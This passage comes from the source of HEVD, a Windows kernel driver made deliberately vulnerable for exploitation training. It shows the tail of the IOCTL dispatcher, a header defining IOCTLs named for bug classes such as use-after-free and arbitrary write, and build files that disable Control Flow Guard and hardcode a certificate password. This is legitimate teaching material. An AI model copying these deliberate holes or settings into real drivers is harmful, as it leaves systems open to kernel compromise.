            Status = UseUaFObjectNonPagedPoolNxIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX ******\n");
            break;
        case HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX:
            DbgPrint("****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX ******\n");
            Status = FreeUaFObjectNonPagedPoolNxIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX ******\n");
            break;
        case HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX:
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX ******\n");
            Status = AllocateFakeObjectNonPagedPoolNxIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX ******\n");
            break;
        case HEVD_IOCTL_CREATE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX:
            DbgPrint("****** HEVD_IOCTL_CREATE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX ******\n");
            Status = CreateArbitraryReadWriteHelperObjectNonPagedPoolNxIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_CREATE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX ******\n");
            break;
        case HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX:
            DbgPrint("****** HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX ******\n");
            Status = SetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX ******\n");
            break;
        case HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX:
            DbgPrint("****** HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX ******\n");
            Status = GetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX ******\n");
            break;
        case HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX:
            DbgPrint("****** HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX ******\n");
            Status = DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX ******\n");
            break;
        case HEVD_IOCTL_ARBITRARY_INCREMENT:
            DbgPrint("****** HEVD_IOCTL_ARBITRARY_INCREMENT ******\n");
            Status = ArbitraryIncrementIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_ARBITRARY_INCREMENT ******\n");
            break;
        default:
            DbgPrint("[-] Invalid IOCTL Code: 0x%X\n", IoControlCode);
            Status = STATUS_INVALID_DEVICE_REQUEST;
            break;
        }
    }

    //
    // Update the IoStatus information
    //

    Irp->IoStatus.Status = Status;
    Irp->IoStatus.Information = 0;

    //
    // Complete the request
    //

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return Status;
}

```

`Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    HackSysExtremeVulnerableDriver.h

Abstract:
    This module implements the data structures for main
    driver module.

--*/

#pragma once

#ifndef __HACKSYS_EXTREME_VULNERABLE_DRIVER_H__
#define __HACKSYS_EXTREME_VULNERABLE_DRIVER_H__

#include "Common.h"


//
// Defines
//

#define BANNER \
        ("                                        \n" \
         " ##     ## ######## ##     ## ########  \n" \
         " ##     ## ##       ##     ## ##     ## \n" \
         " ##     ## ##       ##     ## ##     ## \n" \
         " ######### ######   ##     ## ##     ## \n" \
         " ##     ## ##        ##   ##  ##     ## \n" \
         " ##     ## ##         ## ##   ##     ## \n" \
         " ##     ## ########    ###    ########  \n" \
         "   HackSys Extreme Vulnerable Driver    \n" \
         "             Version: 3.00              \n")

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)


//
// IOCTL Definitions
//

#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
#define HEVD_IOCTL_ARBITRARY_WRITE                               IOCTL(0x802)
#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL                IOCTL(0x803)
#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL           IOCTL(0x807)
#define HEVD_IOCTL_TYPE_CONFUSION                                IOCTL(0x808)
#define HEVD_IOCTL_INTEGER_OVERFLOW                              IOCTL(0x809)
#define HEVD_IOCTL_NULL_POINTER_DEREFERENCE                      IOCTL(0x80A)
#define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK                    IOCTL(0x80B)
#define HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL               IOCTL(0x80C)
#define HEVD_IOCTL_DOUBLE_FETCH                                  IOCTL(0x80D)
#define HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS                   IOCTL(0x80E)
#define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL              IOCTL(0x80F)
#define HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION            IOCTL(0x810)
#define HEVD_IOCTL_WRITE_NULL                                    IOCTL(0x811)
#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX             IOCTL(0x812)
#define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX           IOCTL(0x813)
#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX         IOCTL(0x814)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX              IOCTL(0x815)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX             IOCTL(0x816)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX        IOCTL(0x817)
#define HEVD_IOCTL_CREATE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    IOCTL(0x818)
#define HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  IOCTL(0x819)
#define HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  IOCTL(0x81A)
#define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    IOCTL(0x81B)
#define HEVD_IOCTL_ARBITRARY_INCREMENT                           IOCTL(0x81C)


//
// Dispatch Declarations
//

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD     DriverUnloadHandler;

__drv_dispatchType(IRP_MJ_CREATE)
__drv_dispatchType(IRP_MJ_CLOSE)
DRIVER_DISPATCH IrpCreateCloseHandler;

__drv_dispatchType(IRP_MJ_DEVICE_CONTROL)
DRIVER_DISPATCH IrpDeviceIoCtlHandler;

__drv_dispatchType(IRP_MJ_CREATE)
__drv_dispatchType(IRP_MJ_CREATE_NAMED_PIPE)
DRIVER_DISPATCH IrpNotImplementedHandler;


//
// Function Definitions
//

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
);

VOID
DriverUnloadHandler(
    _In_ PDRIVER_OBJECT DriverObject
);

NTSTATUS
IrpCreateCloseHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
);

NTSTATUS
IrpDeviceIoCtlHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
);

NTSTATUS
IrpNotImplementedHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
);

#endif  // !__HACKSYS_EXTREME_VULNERABLE_DRIVER_H__

```

`Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug Secure|ARM">
      <Configuration>Debug Secure</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug Secure|ARM64">
      <Configuration>Debug Secure</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug Secure|Win32">
      <Configuration>Debug Secure</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug Secure|x64">
      <Configuration>Debug Secure</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug Vulnerable|Win32">
      <Configuration>Debug Vulnerable</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release Secure|ARM">
      <Configuration>Release Secure</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release Secure|ARM64">
      <Configuration>Release Secure</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release Secure|Win32">
      <Configuration>Release Secure</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release Secure|x64">
      <Configuration>Release Secure</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release Vulnerable|Win32">
      <Configuration>Release Vulnerable</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug Vulnerable|x64">
      <Configuration>Debug Vulnerable</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release Vulnerable|x64">
      <Configuration>Release Vulnerable</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug Vulnerable|ARM">
      <Configuration>Debug Vulnerable</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release Vulnerable|ARM">
      <Configuration>Release Vulnerable</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug Vulnerable|ARM64">
      <Configuration>Debug Vulnerable</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release Vulnerable|ARM64">
      <Configuration>Release Vulnerable</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{7C47CF49-817B-452A-8B81-9450F9EF89CA}</ProjectGuid>
    <TemplateGuid>{dd38f7fc-d7bd-488b-9242-7d8754cde80d}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>HackSysExtremeVulnerableDriver</RootNamespace>
    <TargetVersion>Windows7</TargetVersion>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
    <TestCertificate>HEVD.pfx</TestCertificate>
    <Password>Passw0rd!</Password>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|Win32'" Label="Configuration">
    <UseDebugLibraries>true</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|Win32'" Label="Configuration">
    <UseDebugLibraries>true</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|Win32'" Label="Configuration">
    <UseDebugLibraries>false</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|Win32'" Label="Configuration">
    <UseDebugLibraries>false</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|x64'" Label="Configuration">
    <UseDebugLibraries>true</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|x64'" Label="Configuration">
    <UseDebugLibraries>true</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|x64'" Label="Configuration">
    <UseDebugLibraries>false</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|x64'" Label="Configuration">
    <UseDebugLibraries>false</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|ARM'" Label="Configuration">
    <UseDebugLibraries>true</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|ARM'" Label="Configuration">
    <UseDebugLibraries>true</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|ARM'" Label="Configuration">
    <UseDebugLibraries>false</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|ARM'" Label="Configuration">
    <UseDebugLibraries>false</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|ARM64'" Label="Configuration">
    <UseDebugLibraries>true</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|ARM64'" Label="Configuration">
    <UseDebugLibraries>true</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|ARM64'" Label="Configuration">
    <UseDebugLibraries>false</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|ARM64'" Label="Configuration">
    <UseDebugLibraries>false</UseDebugLibraries>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros">
    <TargetName>HEVD</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|x64'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
    <Link />
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|x64'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
      <PreprocessorDefinitions>SECURE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|ARM'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|ARM'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
      <PreprocessorDefinitions>SECURE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release Vulnerable|Win32'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release Secure|Win32'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
      <PreprocessorDefinitions>SECURE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|x64'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|x64'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
      <PreprocessorDefinitions>SECURE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|ARM'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|ARM'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
      <PreprocessorDefinitions>SECURE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug Vulnerable|Win32'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug Secure|Win32'">
    <Inf>
      <TimeStamp>3.00</TimeStamp>
    </Inf>
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
      <PreprocessorDefinitions>SECURE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemGroup>
    <Inf Include="HEVD.inf" />
  </ItemGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ArbitraryIncrement.h" />
    <ClInclude Include="ArbitraryReadWriteHelperNonPagedPoolNx.h" />
    <ClInclude Include="ArbitraryWrite.h" />
    <ClInclude Include="BufferOverflowNonPagedPool.h" />
    <ClInclude Include="BufferOverflowNonPagedPoolNx.h" />
    <ClInclude Include="BufferOverflowPagedPoolSession.h" />
    <ClInclude Include="BufferOverflowStack.h" />
    <ClInclude Include="BufferOverflowStackGS.h" />
    <ClInclude Include="Common.h" />
    <ClInclude Include="DoubleFetch.h" />
    <ClInclude Include="HackSysExtremeVulnerableDriver.h" />
    <ClInclude Include="InsecureKernelResourceAccess.h" />
    <ClInclude Include="IntegerOverflow.h" />
    <ClInclude Include="MemoryDisclosureNonPagedPool.h" />
    <ClInclude Include="MemoryDisclosureNonPagedPoolNx.h" />
    <ClInclude Include="NullPointerDereference.h" />
    <ClInclude Include="TypeConfusion.h" />
    <ClInclude Include="UninitializedMemoryPagedPool.h" />
    <ClInclude Include="UninitializedMemoryStack.h" />
    <ClInclude Include="UseAfterFreeNonPagedPool.h" />
    <ClInclude Include="UseAfterFreeNonPagedPoolNx.h" />
    <ClInclude Include="WriteNULL.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="ArbitraryIncrement.c" />
    <ClCompile Include="ArbitraryReadWriteHelperNonPagedPoolNx.c" />
    <ClCompile Include="ArbitraryWrite.c" />
    <ClCompile Include="BufferOverflowNonPagedPool.c" />
    <ClCompile Include="BufferOverflowNonPagedPoolNx.c" />
    <ClCompile Include="BufferOverflowPagedPoolSession.c" />
    <ClCompile Include="BufferOverflowStack.c" />
    <ClCompile Include="BufferOverflowStackGS.c" />
    <ClCompile Include="DoubleFetch.c" />
    <ClCompile Include="HackSysExtremeVulnerableDriver.c" />
    <ClCompile Include="InsecureKernelResourceAccess.c" />
    <ClCompile Include="IntegerOverflow.c" />
    <ClCompile Include="MemoryDisclosureNonPagedPool.c" />
    <ClCompile Include="MemoryDisclosureNonPagedPoolNx.c" />
    <ClCompile Include="NullPointerDereference.c" />
    <ClCompile Include="TypeConfusion.c" />
    <ClCompile Include="UninitializedMemoryPagedPool.c" />
    <ClCompile Include="UninitializedMemoryStack.c" />
    <ClCompile Include="UseAfterFreeNonPagedPool.c" />
    <ClCompile Include="UseAfterFreeNonPagedPoolNx.c" />
    <ClCompile Include="WriteNULL.c" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Inf Include="HEVD.inf">
      <Filter>Driver Files</Filter>
    </Inf>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ArbitraryWrite.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BufferOverflowNonPagedPool.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BufferOverflowNonPagedPoolNx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BufferOverflowPagedPoolSession.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BufferOverflowStack.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BufferOverflowStackGS.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Common.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DoubleFetch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="HackSysExtremeVulnerableDriver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="InsecureKernelResourceAccess.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="IntegerOverflow.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MemoryDisclosureNonPagedPool.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MemoryDisclosureNonPagedPoolNx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
